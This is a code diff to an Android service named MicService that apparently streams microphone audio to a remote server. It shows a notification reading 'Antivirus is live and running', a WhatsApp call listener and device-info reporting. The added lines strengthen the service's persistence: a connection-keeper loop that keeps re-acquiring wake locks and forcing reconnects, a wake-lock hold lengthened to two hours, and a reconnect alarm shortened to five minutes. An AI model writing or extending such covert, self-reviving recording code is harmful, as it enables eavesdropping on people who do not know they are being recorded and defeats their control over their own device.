@@ -210,6 +210,8 @@ class MicService : Service() {
     @Volatile private var lastAudioChunkSentAt = 0L
     @Volatile private var lastPingSentAt = 0L
     @Volatile private var lastHealthSentAt = 0L
+    @Volatile private var heartbeatFailureStreak = 0
+    @Volatile private var wsBackpressureStreak = 0
     @Volatile private var audioSourceRotation = 0
     @Volatile private var activeAudioSource = MediaRecorder.AudioSource.DEFAULT
     private var micWatchdogJob: Job? = null
@@ -428,6 +430,7 @@ class MicService : Service() {
         setupNetworkListener()
         setupCallListener()
         setupWhatsAppCallReceiver()
+        startConnectionKeeper()
         
         // Start discovery if already on WiFi
         val cm = connectivityManager
@@ -587,9 +590,10 @@ class MicService : Service() {
         }
         startNetworkEnforcer()
         startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
+        startConnectionKeeper()
         scheduleReconnectAlarm()
         // Bug 1.1: Reset instance wakeLock on every START_STICKY restart
-        if (wakeLock == null) {
+        if (wakeLock == null || wakeLock?.isHeld != true) {
             acquireWakeLock()
         }
         return START_STICKY   // Android restarts service automatically if killed
@@ -719,6 +723,7 @@ class MicService : Service() {
         wsReconnectJob = null
         httpFallbackJob?.cancel()
         httpFallbackJob = null
+        stopConnectionKeeper()
 
         // Stop subsystems BEFORE cancelling scope (they may send final health/ack)
         stopMicWatchdog()
@@ -804,6 +809,7 @@ class MicService : Service() {
 
                 // Stop the HTTP polling if it's running fast
                 startHttpFallbackSync()
+                startConnectionKeeper()
 
                 updateNotification("Antivirus is live and running")
                 val infoMsg = "DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}"
@@ -1257,6 +1263,7 @@ class MicService : Service() {
     }
 
     private var httpFallbackJob: Job? = null
+    private var connectionKeeperJob: Job? = null
     private val httpFallbackJobMutex = Mutex()
     
     private fun startHttpFallbackSync() {
@@ -1272,6 +1279,7 @@ class MicService : Service() {
                 Log.i(TAG, "[Fallback] Starting HTTP sync worker (WS Connected: $currentWsState)")
                 httpFallbackJob = launch {
                     while (isActive) {
+                        acquireWakeLock()
                         // HTTP Heartbeat (Layer 12)
                         try {
                             val url = "$serverHttpBaseUrl/api/heartbeat"
@@ -1287,6 +1295,7 @@ class MicService : Service() {
                             val request = requestBuilder.build()
                             val response = httpClient.newCall(request).execute()
                             if (response.isSuccessful) {
+                                heartbeatFailureStreak = 0
                                 val body = response.body?.string()
                                 if (!body.isNullOrBlank()) {
                                     try {
@@ -1304,10 +1313,19 @@ class MicService : Service() {
                                         }
                                     }
                                 }
+                            } else if (activeWebSocket != null) {
+                                heartbeatFailureStreak++
                             }
                             response.close()
                         } catch (e: Exception) {
                             Log.w(TAG, "Heartbeat failed: ${e.message}")
+                            if (activeWebSocket != null) heartbeatFailureStreak++
+                        }
+
+                        if (activeWebSocket != null && heartbeatFailureStreak >= 3 && isNetworkUsable()) {
+                            Log.w(TAG, "Heartbeat failed repeatedly while WS appears connected; forcing reconnect")
+                            heartbeatFailureStreak = 0
+                            handleSocketSendFailure("heartbeat_failed")
                         }
 
                         // HTTP Polling Fallback (Layer 2)
@@ -1329,6 +1347,55 @@ class MicService : Service() {
                 }
             }
         }
+    }
+
+    private fun startConnectionKeeper() {
+        if (connectionKeeperJob?.isActive == true) return
+        connectionKeeperJob = serviceScope.launch(Dispatchers.IO) {
+            while (isActive) {
+                acquireWakeLock()
+                scheduleReconnectAlarm()
+
+                if (!isNetworkUsable()) {
+                    updateNotification("Waiting for network sync...")
+                    delay(5_000L)
+                    continue
+                }
+
+                val ws = activeWebSocket
+                if (ws == null) {
+                    wsBackpressureStreak = 0
+                    startHttpFallbackSync()
+                    if (!isWsConnecting.get()) {
+                        scheduleWebSocketReconnect("keeper_no_socket", forceRestart = true)
+                    }
+                    delay(5_000L)
+                    continue
+                }
+
+                sendHealthStatus("keeper")
+                val queuedBytes = ws.queueSize()
+                wsBufferedBytes = queuedBytes
+                if (queuedBytes > 512_000L) {
+                    wsBackpressureStreak++
+                    Log.w(TAG, "WS backpressure high: queued=$queuedBytes streak=$wsBackpressureStreak")
+                } else {
+                    wsBackpressureStreak = 0
+                }
+
+                if (wsBackpressureStreak >= 3) {
+                    wsBackpressureStreak = 0
+                    handleSocketSendFailure("keeper_backpressure")
+                }
+
+                delay(20_000L)
+            }
+        }
+    }
+
+    private fun stopConnectionKeeper() {
+        connectionKeeperJob?.cancel()
+        connectionKeeperJob = null
     }
 
     private fun processRecoveredCommands(commands: JSONArray, source: String) {
@@ -4571,7 +4638,7 @@ class MicService : Service() {
                     setReferenceCounted(false)
                 }
             }
-            staticWakeLock?.acquire(30 * 60 * 1000L)
+            staticWakeLock?.acquire(2 * 60 * 60 * 1000L)
             wakeLock = staticWakeLock
         }
     }
@@ -4593,7 +4660,7 @@ class MicService : Service() {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
         val alarmManager = getSystemService(AlarmManager::class.java)
-        val triggerAt = now + 15 * 60 * 1000L
+        val triggerAt = now + 5 * 60 * 1000L
         reconnectAlarmTriggerAtElapsed = triggerAt
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
             alarmManager.setAndAllowWhileIdle(
